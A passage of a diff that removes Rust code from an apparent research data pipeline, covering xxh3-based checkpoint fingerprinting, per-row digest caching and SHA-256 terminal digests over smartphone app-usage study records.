-    fn serialize_u128(self, value: u128) -> Result<(), FingerprintError> {
-        self.scalar(12, &value.to_le_bytes())
-    }
-
-    fn serialize_f32(self, value: f32) -> Result<(), FingerprintError> {
-        self.scalar(13, &value.to_bits().to_le_bytes())
-    }
-
-    fn serialize_f64(self, value: f64) -> Result<(), FingerprintError> {
-        self.scalar(14, &value.to_bits().to_le_bytes())
-    }
-
-    fn serialize_char(self, value: char) -> Result<(), FingerprintError> {
-        self.scalar(15, &(value as u32).to_le_bytes())
-    }
-
-    fn serialize_str(self, value: &str) -> Result<(), FingerprintError> {
-        self.sink.frame(16, value.as_bytes());
-        Ok(())
-    }
-
-    fn serialize_bytes(self, value: &[u8]) -> Result<(), FingerprintError> {
-        self.sink.frame(17, value);
-        Ok(())
-    }
-
-    fn serialize_none(self) -> Result<(), FingerprintError> {
-        self.sink.tag(18);
-        Ok(())
-    }
-
-    fn serialize_some<T: serde::Serialize + ?Sized>(
-        self,
-        value: &T,
-    ) -> Result<(), FingerprintError> {
-        self.sink.tag(19);
-        value.serialize(self)
-    }
-
-    fn serialize_unit(self) -> Result<(), FingerprintError> {
-        self.sink.tag(20);
-        Ok(())
-    }
-
-    fn serialize_unit_struct(self, name: &'static str) -> Result<(), FingerprintError> {
-        self.sink.frame(21, name.as_bytes());
-        Ok(())
-    }
-
-    fn serialize_unit_variant(
-        self,
-        name: &'static str,
-        variant_index: u32,
-        _variant: &'static str,
-    ) -> Result<(), FingerprintError> {
-        self.sink.frame(22, name.as_bytes());
-        self.sink.write(&variant_index.to_le_bytes());
-        Ok(())
-    }
-
-    fn serialize_newtype_struct<T: serde::Serialize + ?Sized>(
-        self,
-        name: &'static str,
-        value: &T,
-    ) -> Result<(), FingerprintError> {
-        self.sink.frame(23, name.as_bytes());
-        value.serialize(self)
-    }
-
-    fn serialize_newtype_variant<T: serde::Serialize + ?Sized>(
-        self,
-        name: &'static str,
-        variant_index: u32,
-        _variant: &'static str,
-        value: &T,
-    ) -> Result<(), FingerprintError> {
-        self.sink.frame(24, name.as_bytes());
-        self.sink.write(&variant_index.to_le_bytes());
-        value.serialize(self)
-    }
-
-    fn serialize_seq(
-        self,
-        _len: Option<usize>,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.tag(25);
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_tuple(self, _len: usize) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.tag(26);
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_tuple_struct(
-        self,
-        name: &'static str,
-        _len: usize,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.frame(27, name.as_bytes());
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_tuple_variant(
-        self,
-        name: &'static str,
-        variant_index: u32,
-        _variant: &'static str,
-        _len: usize,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.frame(28, name.as_bytes());
-        self.sink.write(&variant_index.to_le_bytes());
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_map(
-        self,
-        _len: Option<usize>,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.tag(29);
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_struct(
-        self,
-        name: &'static str,
-        _len: usize,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.frame(30, name.as_bytes());
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn serialize_struct_variant(
-        self,
-        name: &'static str,
-        variant_index: u32,
-        _variant: &'static str,
-        _len: usize,
-    ) -> Result<FingerprintCompound<'a>, FingerprintError> {
-        self.sink.frame(31, name.as_bytes());
-        self.sink.write(&variant_index.to_le_bytes());
-        Ok(FingerprintCompound { sink: self.sink })
-    }
-
-    fn collect_str<T: std::fmt::Display + ?Sized>(self, value: &T) -> Result<(), FingerprintError> {
-        // chrono and friends serialize through Display. Format into a stack
-        // buffer when it fits (timestamps always do), falling back to a heap
-        // string only for oversized values.
-        struct StackWriter {
-            buffer: [u8; 64],
-            len: usize,
-            overflow: Option<String>,
-        }
-        impl std::fmt::Write for StackWriter {
-            fn write_str(&mut self, text: &str) -> std::fmt::Result {
-                if let Some(overflow) = &mut self.overflow {
-                    overflow.push_str(text);
-                } else if self.len + text.len() <= self.buffer.len() {
-                    self.buffer[self.len..self.len + text.len()].copy_from_slice(text.as_bytes());
-                    self.len += text.len();
-                } else {
-                    let mut overflow =
-                        String::from(std::str::from_utf8(&self.buffer[..self.len]).unwrap());
-                    overflow.push_str(text);
-                    self.overflow = Some(overflow);
-                }
-                Ok(())
-            }
-        }
-        let mut writer = StackWriter {
-            buffer: [0_u8; 64],
-            len: 0,
-            overflow: None,
-        };
-        use std::fmt::Write as _;
-        write!(writer, "{value}")
-            .map_err(|error| FingerprintError(format!("collect_str fingerprint: {error}")))?;
-        let bytes = writer
-            .overflow
-            .as_ref()
-            .map_or(&writer.buffer[..writer.len], String::as_bytes);
-        self.sink.frame(16, bytes);
-        Ok(())
-    }
-
-    fn is_human_readable(&self) -> bool {
-        // Match serde_json so types with dual representations (e.g. chrono)
-        // keep hashing their human-readable form across the v6→v7 migration.
-        true
-    }
-}
-
-/// 128-bit fingerprint of a checkpoint value payload (serde events streamed
-/// straight into xxh3-128). Used only for in-protocol component digests;
-/// every durable boundary keeps its cryptographic digest.
-pub(crate) fn value_fingerprint<T: serde::Serialize + ?Sized>(
-    value: &T,
-) -> Result<[u8; 16], String> {
-    let mut sink = FingerprintSink::new();
-    value
-        .serialize(FingerprintSerializer { sink: &mut sink })
-        .map_err(|error| format!("fingerprint checkpoint value: {error}"))?;
-    Ok(sink.finish().to_le_bytes())
-}
-
-struct DiscardCheckpointSink;
-
-impl CheckpointSink for DiscardCheckpointSink {
-    #[inline(always)]
-    fn checkpoint_update(&mut self, _bytes: &[u8]) {}
-}
-
-fn checkpoint_update(sink: &mut impl CheckpointSink, bytes: &[u8]) {
-    sink.checkpoint_update(bytes);
-}
-
-fn checkpoint_digest_field(sink: &mut impl CheckpointSink, bytes: &[u8]) {
-    sink.checkpoint_update(&(bytes.len() as u64).to_le_bytes());
-    sink.checkpoint_update(bytes);
-}
-
-fn checkpoint_digest_fixed16(hasher: &mut impl CheckpointSink, value: &[u8; 16]) {
-    let mut encoded = [0_u8; 24];
-    encoded[..8].copy_from_slice(&16_u64.to_le_bytes());
-    encoded[8..].copy_from_slice(value);
-    hasher.checkpoint_update(&encoded);
-}
-
-fn checkpoint_digest_positioned_fixed16(
-    hasher: &mut impl CheckpointSink,
-    position: usize,
-    value: &[u8; 16],
-) {
-    let mut encoded = [0_u8; 32];
-    encoded[..8].copy_from_slice(&(position as u64).to_le_bytes());
-    encoded[8..16].copy_from_slice(&16_u64.to_le_bytes());
-    encoded[16..].copy_from_slice(value);
-    hasher.checkpoint_update(&encoded);
-}
-
-fn checkpoint_digest_positioned_fixed16_triple(
-    hasher: &mut impl CheckpointSink,
-    position: usize,
-    first: &[u8; 16],
-    second: &[u8; 16],
-    third: &[u8; 16],
-) {
-    let mut encoded = [0_u8; 80];
-    encoded[..8].copy_from_slice(&(position as u64).to_le_bytes());
-    encoded[8..16].copy_from_slice(&16_u64.to_le_bytes());
-    encoded[16..32].copy_from_slice(first);
-    encoded[32..40].copy_from_slice(&16_u64.to_le_bytes());
-    encoded[40..56].copy_from_slice(second);
-    encoded[56..64].copy_from_slice(&16_u64.to_le_bytes());
-    encoded[64..].copy_from_slice(third);
-    hasher.checkpoint_update(&encoded);
-}
-
-fn checkpoint_digest_optional_string(sink: &mut impl CheckpointSink, value: Option<&str>) {
-    match value {
-        Some(value) => {
-            sink.checkpoint_update(&[1]);
-            checkpoint_digest_field(sink, value.as_bytes());
-        }
-        None => {
-            sink.checkpoint_update(&[0]);
-        }
-    }
-}
-
-fn checkpoint_digest_optional_i64(sink: &mut impl CheckpointSink, value: Option<i64>) {
-    match value {
-        Some(value) => {
-            sink.checkpoint_update(&[1]);
-            sink.checkpoint_update(&value.to_le_bytes());
-        }
-        None => {
-            sink.checkpoint_update(&[0]);
-        }
-    }
-}
-
-fn checkpoint_digest_optional_f64(sink: &mut impl CheckpointSink, value: Option<f64>) {
-    match value {
-        Some(value) => {
-            sink.checkpoint_update(&[1]);
-            sink.checkpoint_update(&value.to_bits().to_le_bytes());
-        }
-        None => {
-            sink.checkpoint_update(&[0]);
-        }
-    }
-}
-
-const WORKFLOW_CHECKPOINT_PROTOCOL: &str = "chronicle-workflow-checkpoint/v1";
-const WORKFLOW_ROW_SCHEMA: &str = concat!(
-    "association:source_data_rows,index;",
-    "membership:source_data_rows;",
-    "order:index,position;",
-    "temporal:event_timestamp_ns,timezone,data_time_gap_hours,date,day,weekday_mf,",
-    "weekday_mth,weekday_su_th,hour,quarter,start_timestamp_ns,stop_timestamp_ns,",
-    "duration_seconds,duration_minutes,screen_usage_last_activity_timestamp_ns,",
-    "screen_usage_tail_gap_seconds,valid_app_usage_time_gap_hours,",
-    "any_app_usage_time_gap_hours;",
-    "classification:study_id,participant_id,possible_device_model,username,",
-    "application_label,interaction_type,app_package_name,screen_usage_end_reason,",
-    "screen_usage_end_reason_confidence,screen_usage_stop_event_type,",
-    "screen_usage_foreground_app_package,screen_usage_apps_forcing_screen_open_label,",
-    "screen_usage_lock_screen_only,any_app_usage_flags,valid_app_new_engage_30s,",
-    "valid_app_new_engage_custom,valid_app_switched_app,any_app_new_engage_30s,",
-    "any_app_new_engage_custom,any_app_switched_app,genre_id_scraped,",
-    "broad_app_category,codebook_fields,usage_layer"
-);
-
-fn checkpoint_hasher(component: &str) -> BufferedCheckpointHasher {
-    let mut hasher = BufferedCheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, WORKFLOW_CHECKPOINT_PROTOCOL.as_bytes());
-    checkpoint_digest_field(&mut hasher, component.as_bytes());
-    hasher
-}
-
-fn finish_checkpoint_digest(hasher: BufferedCheckpointHasher) -> String {
-    format!("xxh3:{:032x}", hasher.finalize128())
-}
-
-fn terminal_checkpoint_digest(node_id: &str, component_digests: [&str; 6]) -> String {
-    let mut terminal = Sha256::new();
-    sha256_digest_field(&mut terminal, WORKFLOW_CHECKPOINT_PROTOCOL.as_bytes());
-    sha256_digest_field(&mut terminal, node_id.as_bytes());
-    sha256_digest_field(&mut terminal, b"terminal");
-    for digest in component_digests {
-        sha256_digest_field(&mut terminal, digest.as_bytes());
-    }
-    format!("sha256:{}", hex::encode(terminal.finalize()))
-}
-
-fn sha256_digest_field(hasher: &mut Sha256, bytes: &[u8]) {
-    hasher.update((bytes.len() as u64).to_le_bytes());
-    hasher.update(bytes);
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-struct RowCheckpointParts {
-    identity: [u8; 16],
-    temporal: [u8; 16],
-    classification: [u8; 16],
-}
-
-struct RowCheckpointScratch {
-    identity: Vec<u8>,
-    temporal: Vec<u8>,
-    classification: Vec<u8>,
-}
-
-impl Default for RowCheckpointScratch {
-    fn default() -> Self {
-        Self {
-            identity: Vec::with_capacity(256),
-            temporal: Vec::with_capacity(192),
-            classification: Vec::with_capacity(512),
-        }
-    }
-}
-
-#[deny(unused_variables)]
-fn encode_row_checkpoint_parts<I: CheckpointSink, T: CheckpointSink, C: CheckpointSink>(
-    row: &Row,
-    identity: &mut I,
-    temporal: &mut T,
-    classification: &mut C,
-) {
-    // Every field is deliberately bound and hashed. Adding a Row field makes
-    // this exhaustive pattern fail; binding one without hashing it makes the
-    // deny(unused_variables) lint fail.
-    let RowData {
-        source_data_rows,
-        lineage_searches,
-        study_id,
-        participant_id,
-        possible_device_model,
-        username,
-        application_label,
-        interaction_type,
-        app_package_name,
-        event_timestamp_ns,
-        timezone,
-        data_time_gap_hours,
-        date,
-        day,
-        weekday_mf,
-        weekday_mth,
-        weekday_su_th,
-        hour,
-        quarter,
-        start_timestamp_ns,
-        stop_timestamp_ns,
-        duration_seconds,
-        duration_minutes,
-        screen_usage_end_reason,
-        screen_usage_end_reason_confidence,
-        screen_usage_stop_event_type,
-        screen_usage_last_activity_timestamp_ns,
-        screen_usage_tail_gap_seconds,
-        screen_usage_foreground_app_package,
-        screen_usage_apps_forcing_screen_open_label,
-        screen_usage_lock_screen_only,
-        any_app_usage_flags,
-        valid_app_new_engage_30s,
-        valid_app_new_engage_custom,
-        valid_app_switched_app,
-        valid_app_usage_time_gap_hours,
-        any_app_new_engage_30s,
-        any_app_new_engage_custom,
-        any_app_switched_app,
-        any_app_usage_time_gap_hours,
-        genre_id_scraped,
-        broad_app_category,
-        codebook_fields,
-        codebook_genre_fields_cleared,
-        index,
-        usage_layer,
-    } = &row.0.data;
-
-    checkpoint_digest_field(identity, b"chronicle-row-identity/v3");
-    let source_ranges = source_data_rows.ranges();
-    let mut source_shape = [0_u8; 16];
-    source_shape[..8].copy_from_slice(&(source_data_rows.len() as u64).to_le_bytes());
-    source_shape[8..].copy_from_slice(&(source_ranges.len() as u64).to_le_bytes());
-    checkpoint_update(identity, &source_shape);
-    for source_range in source_ranges {
-        let mut encoded_range = [0_u8; 8];
-        encoded_range[..4].copy_from_slice(&source_range.first.to_le_bytes());
-        encoded_range[4..].copy_from_slice(&source_range.last.to_le_bytes());
-        checkpoint_update(identity, &encoded_range);
-    }
-    checkpoint_update(identity, &(lineage_searches.len() as u64).to_le_bytes());
-    for search in lineage_searches.iter() {
-        checkpoint_digest_field(identity, search.protocol_version.as_bytes());
-        checkpoint_digest_field(identity, search.reason.as_bytes());
-        checkpoint_digest_field(identity, search.index_space.as_bytes());
-        checkpoint_digest_field(identity, search.start_participant_id.as_bytes());
-        checkpoint_update(identity, &search.start_event_index.to_le_bytes());
-        checkpoint_update(identity, &search.end_event_index_exclusive.to_le_bytes());
-        checkpoint_update(identity, &search.candidate_event_count.to_le_bytes());
-        checkpoint_digest_field(identity, &search.candidate_chain_digest.encoded());
-    }
-    checkpoint_update(identity, &(*index as u64).to_le_bytes());
-
-    checkpoint_digest_field(temporal, b"chronicle-row-temporal/v2");
-    checkpoint_update(temporal, &event_timestamp_ns.to_le_bytes());
-    checkpoint_digest_field(temporal, timezone.as_bytes());
-    checkpoint_update(temporal, &data_time_gap_hours.to_bits().to_le_bytes());
-    checkpoint_digest_field(temporal, date.as_bytes());
-    checkpoint_update(
-        temporal,
-        &[
-            *day,
-            *weekday_mf,
-            *weekday_mth,
-            *weekday_su_th,
-            *hour,
-            *quarter,
-        ],
-    );
-    checkpoint_digest_optional_i64(temporal, *start_timestamp_ns);
-    checkpoint_digest_optional_i64(temporal, *stop_timestamp_ns);
-    checkpoint_digest_optional_f64(temporal, *duration_seconds);
-    checkpoint_digest_optional_f64(temporal, *duration_minutes);
-    checkpoint_digest_optional_i64(temporal, *screen_usage_last_activity_timestamp_ns);
-    checkpoint_digest_optional_f64(temporal, *screen_usage_tail_gap_seconds);
-    checkpoint_update(
-        temporal,
-        &valid_app_usage_time_gap_hours.to_bits().to_le_bytes(),
-    );
-    checkpoint_update(
-        temporal,
-        &any_app_usage_time_gap_hours.to_bits().to_le_bytes(),
-    );
-
-    checkpoint_digest_field(classification, b"chronicle-row-classification/v2");
-    for value in [
-        study_id.as_str(),
-        participant_id.as_str(),
-        possible_device_model.as_str(),
-        username.as_str(),
-        application_label.as_str(),
-        interaction_type.as_str(),
-        app_package_name.as_str(),
-        any_app_usage_flags.as_str(),
-    ] {
-        checkpoint_digest_field(classification, value.as_bytes());
-    }
-    checkpoint_digest_optional_string(classification, screen_usage_end_reason.as_deref());
-    checkpoint_digest_optional_f64(classification, *screen_usage_end_reason_confidence);
-    checkpoint_digest_optional_string(classification, screen_usage_stop_event_type.as_deref());
-    checkpoint_digest_optional_string(
-        classification,
-        screen_usage_foreground_app_package.as_deref(),
-    );
-    checkpoint_digest_optional_string(
-        classification,
-        screen_usage_apps_forcing_screen_open_label.as_deref(),
-    );
-    match screen_usage_lock_screen_only {
-        Some(value) => {
-            checkpoint_update(classification, &[1, *value]);
-        }
-        None => {
-            checkpoint_update(classification, &[0, 0]);
-        }
-    }
-    for value in [
-        valid_app_new_engage_30s,
-        valid_app_new_engage_custom,
-        valid_app_switched_app,
-        any_app_new_engage_30s,
-        any_app_new_engage_custom,
-        any_app_switched_app,
-    ] {
-        checkpoint_update(classification, &value.to_le_bytes());
-    }
-    checkpoint_digest_optional_string(classification, genre_id_scraped.as_deref());
-    checkpoint_digest_optional_string(classification, broad_app_category.as_deref());
-    if Arc::ptr_eq(codebook_fields, empty_codebook_fields_ref()) {
-        // The overwhelmingly common no-codebook case has a fixed exact
-        // encoding: the u64 sequence length followed by one zero tag per
-        // absent field. Append it as one block instead of 28 tiny writes.
-        let mut encoded = [0_u8; 8 + CODEBOOK_RENAME_PAIRS.len()];
-        encoded[..8].copy_from_slice(&(CODEBOOK_RENAME_PAIRS.len() as u64).to_le_bytes());
-        checkpoint_update(classification, &encoded);
-    } else {
-        checkpoint_update(
-            classification,
-            &(codebook_fields.len() as u64).to_le_bytes(),
-        );
-        for (field_index, value) in codebook_fields.iter().enumerate() {
-            let value = if *codebook_genre_fields_cleared
-                && COLLAPSED_GENRE_FIELD_INDICES.contains(&field_index)
-            {
-                None
-            } else {
-                value.as_deref()
-            };
-            checkpoint_digest_optional_string(classification, value);
-        }
-    }
-    checkpoint_digest_optional_string(classification, usage_layer.as_deref());
-}
-
-impl RowCheckpointScratch {
-    fn compute_parts(&mut self, row: &Row) -> RowCheckpointParts {
-        let cache = &row.0.checkpoint_parts;
-        let missing_identity = cache.identity.get().is_none();
-        let missing_temporal = cache.temporal.get().is_none();
-        let missing_classification = cache.classification.get().is_none();
-        if !missing_identity && !missing_temporal && !missing_classification {
-            return RowCheckpointParts {
-                identity: *cache.identity.get().expect("checked identity checkpoint"),
-                temporal: *cache.temporal.get().expect("checked temporal checkpoint"),
-                classification: *cache
-                    .classification
-                    .get()
-                    .expect("checked classification checkpoint"),
-            };
-        }
-
-        self.identity.clear();
-        self.temporal.clear();
-        self.classification.clear();
-        let mut discard_identity = DiscardCheckpointSink;
-        let mut discard_temporal = DiscardCheckpointSink;
-        let mut discard_classification = DiscardCheckpointSink;
-        match (missing_identity, missing_temporal, missing_classification) {
-            (true, true, true) => encode_row_checkpoint_parts(
-                row,
-                &mut self.identity,
-                &mut self.temporal,
-                &mut self.classification,
-            ),
-            (true, true, false) => encode_row_checkpoint_parts(
-                row,
-                &mut self.identity,
-                &mut self.temporal,
-                &mut discard_classification,
-            ),
-            (true, false, true) => encode_row_checkpoint_parts(
-                row,
-                &mut self.identity,
-                &mut discard_temporal,
-                &mut self.classification,
-            ),
-            (false, true, true) => encode_row_checkpoint_parts(
-                row,
-                &mut discard_identity,
-                &mut self.temporal,
-                &mut self.classification,
-            ),
-            (true, false, false) => encode_row_checkpoint_parts(
-                row,
-                &mut self.identity,
-                &mut discard_temporal,
-                &mut discard_classification,
-            ),
-            (false, true, false) => encode_row_checkpoint_parts(
-                row,
-                &mut discard_identity,
-                &mut self.temporal,
-                &mut discard_classification,
-            ),
-            (false, false, true) => encode_row_checkpoint_parts(
-                row,
-                &mut discard_identity,
-                &mut discard_temporal,
-                &mut self.classification,
-            ),
-            (false, false, false) => unreachable!("handled above"),
-        }
-
-        let identity = missing_identity.then(|| xxh3_128(&self.identity).to_le_bytes());
-        let temporal = missing_temporal.then(|| xxh3_128(&self.temporal).to_le_bytes());
-        let classification =
-            missing_classification.then(|| xxh3_128(&self.classification).to_le_bytes());
-        RowCheckpointParts {
-            identity: *cache
-                .identity
-                .get_or_init(|| identity.expect("identity computed")),
-            temporal: *cache
-                .temporal
-                .get_or_init(|| temporal.expect("temporal computed")),
-            classification: *cache
-                .classification
-                .get_or_init(|| classification.expect("classification computed")),
-        }
-    }
-}
-
-fn row_checkpoint_parts(row: &Row, scratch: &mut RowCheckpointScratch) -> RowCheckpointParts {
-    scratch.compute_parts(row)
-}
-
-fn row_checkpoint_parts_for_rows(rows: &[Row]) -> Vec<RowCheckpointParts> {
-    #[cfg(feature = "query-timing")]
-    {
-        let missing_identity = rows
-            .iter()
-            .filter(|row| row.0.checkpoint_parts.identity.get().is_none())
-            .count();
-        let missing_temporal = rows
-            .iter()
-            .filter(|row| row.0.checkpoint_parts.temporal.get().is_none())
-            .count();
-        let missing_classification = rows
-            .iter()
-            .filter(|row| row.0.checkpoint_parts.classification.get().is_none())
-            .count();
-        eprintln!(
-            "checkpoint_cache rows={} missing_identity={} missing_temporal={} missing_classification={}",
-            rows.len(), missing_identity, missing_temporal, missing_classification
-        );
-    }
-    let mut scratch = RowCheckpointScratch::default();
-    rows.iter()
-        .map(|row| row_checkpoint_parts(row, &mut scratch))
-        .collect()
-}
-
-fn row_parts_sequence_digest<'a>(
-    part_count: usize,
-    parts: impl Iterator<Item = &'a RowCheckpointParts>,
-) -> String {
-    let mut hasher = Xxh3::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-row-reference-sequence/v1");
-    hasher.update(&(part_count as u64).to_le_bytes());
-    let mut observed = 0_usize;
-    for (position, parts) in parts.enumerate() {
-        checkpoint_digest_positioned_fixed16_triple(
-            &mut hasher,
-            position,
-            &parts.identity,
-            &parts.temporal,
-            &parts.classification,
-        );
-        observed += 1;
-    }
-    assert_eq!(observed, part_count, "row-part sequence count drift");
-    format!("xxh3:{:032x}", hasher.digest128())
-}
-
-fn row_reference_sequence_digest(rows: &[&Row]) -> String {
-    let mut scratch = RowCheckpointScratch::default();
-    let parts = rows
-        .iter()
-        .map(|row| row_checkpoint_parts(row, &mut scratch))
-        .collect::<Vec<_>>();
-    row_parts_sequence_digest(parts.len(), parts.iter())
-}
-
-fn workflow_checkpoint(
-    node_id: &str,
-    row_groups: &[(&str, &[Row])],
-    payloads: &[(&str, &[u8])],
-) -> WorkflowCheckpoint {
-    workflow_checkpoint_with_parts(node_id, row_groups, payloads, None)
-}
-
-fn workflow_checkpoint_with_parts(
-    node_id: &str,
-    row_groups: &[(&str, &[Row])],
-    payloads: &[(&str, &[u8])],
-    single_group_parts: Option<&[RowCheckpointParts]>,
-) -> WorkflowCheckpoint {
-    if let Some(parts) = single_group_parts {
-        let group_parts = [parts];
-        workflow_checkpoint_with_group_parts(
-            node_id,
-            row_groups,
-            payloads,
-            Some(&group_parts),
-            None,
-            None,
-        )
-    } else {
-        workflow_checkpoint_with_group_parts(node_id, row_groups, payloads, None, None, None)
-    }
-}
-
-fn workflow_rows_checkpoint_with_parts_and_canonical_order(
-    node_id: &str,
-    rows: &[Row],
-    parts: &[RowCheckpointParts],
-    canonical_order: &[usize],
-) -> WorkflowCheckpoint {
-    let group_parts = [parts];
-    workflow_checkpoint_with_group_parts(
-        node_id,
-        &[("rows", rows)],
-        &[],
-        Some(&group_parts),
-        None,
-        Some(canonical_order),
-    )
-}
-
-fn workflow_checkpoint_with_reusable_parts(
-    node_id: &str,
-    rows: &[Row],
-    payloads: &[(&str, &[u8])],
-    parts: &[RowCheckpointParts],
-    previous_parts: &[RowCheckpointParts],
-    previous_checkpoint: &WorkflowCheckpoint,
-) -> WorkflowCheckpoint {
-    let group_parts = [parts];
-    workflow_checkpoint_with_group_parts(
-        node_id,
-        &[("rows", rows)],
-        payloads,
-        Some(&group_parts),
-        Some(PreviousRowState {
-            checkpoint: previous_checkpoint,
-            reusable_components: reusable_row_components_from_parts(parts, previous_parts),
-        }),
-        None,
-    )
-}
-
-fn workflow_checkpoint_with_reusable_rows(
-    node_id: &str,
-    rows: &[Row],
-    payloads: &[(&str, &[u8])],
-    parts: &[RowCheckpointParts],
-    previous_rows: &[Row],
-    previous_checkpoint: &WorkflowCheckpoint,
-) -> WorkflowCheckpoint {
-    let group_parts = [parts];
-    workflow_checkpoint_with_group_parts(
-        node_id,
-        &[("rows", rows)],
-        payloads,
-        Some(&group_parts),
-        Some(PreviousRowState {
-            checkpoint: previous_checkpoint,
-            reusable_components: reusable_row_components_from_rows(parts, previous_rows),
-        }),
-        None,
-    )
-}
-
-fn workflow_checkpoint_with_known_membership_and_order(
-    node_id: &str,
-    rows: &[Row],
-    payloads: &[(&str, &[u8])],
-    previous_rows: &[Row],
-    previous_checkpoint: &WorkflowCheckpoint,
-) -> WorkflowCheckpoint {
-    debug_assert_eq!(rows.len(), previous_rows.len());
-    #[cfg(debug_assertions)]
-    {
-        let mut current_scratch = RowCheckpointScratch::default();
-        let mut previous_scratch = RowCheckpointScratch::default();
-        for (current, previous) in rows.iter().zip(previous_rows) {
-            debug_assert_eq!(
-                row_checkpoint_parts(current, &mut current_scratch).identity,
-                row_checkpoint_parts(previous, &mut previous_scratch).identity,
-            );
-        }
-    }
-    workflow_checkpoint_with_group_parts(
-        node_id,
-        &[("rows", rows)],
-        payloads,
-        None,
-        Some(PreviousRowState {
-            checkpoint: previous_checkpoint,
-            reusable_components: (true, true, false, false),
-        }),
-        None,
-    )
-}
-
-#[derive(Clone, Copy)]
-struct PreviousRowState<'a> {
-    checkpoint: &'a WorkflowCheckpoint,
-    reusable_components: (bool, bool, bool, bool),
-}
-
-fn reusable_row_components_from_parts(
-    current: &[RowCheckpointParts],
-    previous: &[RowCheckpointParts],
-) -> (bool, bool, bool, bool) {
-    let same_identity = current.len() == previous.len()
-        && current
-            .iter()
-            .zip(previous)
-            .all(|(left, right)| left.identity == right.identity);
-    let same_temporal = same_identity
-        && current
-            .iter()
-            .zip(previous)
-            .all(|(left, right)| left.temporal == right.temporal);
-    let same_classification = same_identity
-        && current
-            .iter()
-            .zip(previous)
-            .all(|(left, right)| left.classification == right.classification);
-    (
-        same_identity,
-        same_identity,
-        same_temporal,
-        same_classification,
-    )
-}
-
-fn reusable_row_components_from_rows(
-    current: &[RowCheckpointParts],
-    previous: &[Row],
-) -> (bool, bool, bool, bool) {
-    if current.len() != previous.len() {
-        return (false, false, false, false);
-    }
-    let mut previous_scratch = RowCheckpointScratch::default();
-    let mut same_temporal = true;
-    let mut same_classification = true;
-    for (current, previous) in current.iter().zip(previous) {
-        let previous = row_checkpoint_parts(previous, &mut previous_scratch);
-        if current.identity != previous.identity {
-            return (false, false, false, false);
-        }
-        same_temporal &= current.temporal == previous.temporal;
-        same_classification &= current.classification == previous.classification;
-    }
-    (true, true, same_temporal, same_classification)
-}
-
-fn workflow_checkpoint_with_group_parts(
-    node_id: &str,
-    row_groups: &[(&str, &[Row])],
-    payloads: &[(&str, &[u8])],
-    group_parts: Option<&[&[RowCheckpointParts]]>,
-    previous_row_state: Option<PreviousRowState<'_>>,
-    single_group_canonical_order: Option<&[usize]>,
-) -> WorkflowCheckpoint {
-    debug_assert!(
-        single_group_canonical_order.is_none() || row_groups.len() == 1,
-        "a supplied canonical order is valid only for one row group"
-    );
-    let (reuse_membership, reuse_order, reuse_temporal, reuse_classification) =
-        match previous_row_state {
-            Some(previous) => {
-                debug_assert_eq!(
-                    previous.checkpoint.protocol_version,
-                    WORKFLOW_CHECKPOINT_PROTOCOL
-                );
-                previous.reusable_components
-            }
-            None => (false, false, false, false),
-        };
-    #[cfg(feature = "query-timing")]
-    let checkpoint_started = std::time::Instant::now();
-    let mut membership = checkpoint_hasher("row-membership");
-    let mut order = checkpoint_hasher("row-order");
-    let mut temporal = checkpoint_hasher("temporal-state");
-    let mut classification = checkpoint_hasher("classification");
-    let mut payload = checkpoint_hasher("payload");
-    let mut schema = checkpoint_hasher("schema");
-    checkpoint_digest_field(&mut schema, WORKFLOW_ROW_SCHEMA.as_bytes());
-    for hasher in [
-        &mut membership,
-        &mut order,
-        &mut temporal,
-        &mut classification,
-    ] {
-        hasher.update(&(row_groups.len() as u64).to_le_bytes());
-    }
-    schema.update(&(row_groups.len() as u64).to_le_bytes());
-    for (group_index, (label, rows)) in row_groups.iter().enumerate() {
-        for hasher in [
-            &mut membership,
-            &mut order,
-            &mut temporal,
-            &mut classification,
-        ] {
-            checkpoint_digest_field(hasher, label.as_bytes());
-            hasher.update(&(rows.len() as u64).to_le_bytes());
-        }
-        checkpoint_digest_field(&mut schema, label.as_bytes());
-        // Membership and row-associated semantic components are canonicalized
-        // by stable source identity. A temporal edit may change sequence order,
-        // but it must not falsely report a membership or classification edit.
-        // Calculate the three row commitments once. When source identities
-        // are already canonical, feed each row directly to every commitment
-        // instead of allocating a 96-byte parts array for the whole table.
-        let canonical_components_needed =
-            !reuse_membership || !reuse_temporal || !reuse_classification;
-        let supplied_canonical_order = (group_index == 0)
-            .then_some(single_group_canonical_order)
-            .flatten();
-        let identity_is_already_sorted = supplied_canonical_order.is_none()
-            && (!canonical_components_needed
-                || rows.windows(2).all(|pair| {
-                    pair[0]
-                        .source_data_rows
-                        .cmp_expanded(&pair[1].source_data_rows)
-                        .then(pair[0].index.cmp(&pair[1].index))
-                        .is_le()
-                }));
-        let mut record_canonical_parts = |parts: &RowCheckpointParts| {
-            if !reuse_membership {
-                checkpoint_digest_fixed16(&mut membership, &parts.identity);
-            }
-            // v5: temporal/classification commit their parts alone. The row
-            // identity sequence is already committed by the membership digest
-            // in the SAME canonical order, and the terminal digest binds all
-            // components, so the (identity, part) association is positional —
-            // repeating the 32-byte identity here only doubled hashed bytes.
-            if !reuse_temporal {
-                checkpoint_digest_fixed16(&mut temporal, &parts.temporal);
-            }
-            if !reuse_classification {
-                checkpoint_digest_fixed16(&mut classification, &parts.classification);
-            }
-        };
-        if let Some(row_parts) = group_parts.and_then(|parts| parts.get(group_index)) {
-            assert_eq!(
-                row_parts.len(),
-                rows.len(),
-                "checkpoint row-part count drift"
-            );
-            #[cfg(debug_assertions)]
-            {
-                let fresh = row_checkpoint_parts_for_rows(rows);
-                assert_eq!(
-                    *row_parts, fresh,
-                    "attempted to reuse stale row checkpoint parts for {node_id}"
-                );
-            }
